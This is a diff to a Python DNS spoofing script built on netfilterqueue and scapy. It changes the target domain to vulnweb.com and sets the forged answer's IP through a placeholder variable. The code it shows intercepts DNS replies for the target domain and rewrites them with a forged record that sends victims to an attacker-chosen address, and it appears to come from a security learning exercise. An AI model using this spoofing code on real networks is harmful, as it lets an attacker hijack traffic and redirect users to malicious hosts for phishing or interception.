@@ -2,7 +2,8 @@ import netfilterqueue
 import scapy.all as scapy
 
 
-target_domain = "www.bing.com"
+target_domain = "vulnweb.com"
+ip_to_redirect = "000.000.000.000"
 
 
 def process_packet(packet):
@@ -15,7 +16,7 @@ def process_packet(packet):
             print("[+] Spoofing target")
             # creating a DNSRR answer:
             # scapy will fill the fields that we dont specify in our DNSRR, so we just need to modify the ones we want to modify, the rrname and the rdata (where the ip is)
-            answer = scapy.DNSRR(rrname=qname, rdata="172.16.239.132")
+            answer = scapy.DNSRR(rrname=qname, rdata=ip_to_redirect)
             # switching the original answer to ours
             scapy_packet[scapy.DNS].an = answer
             # editing the answer count
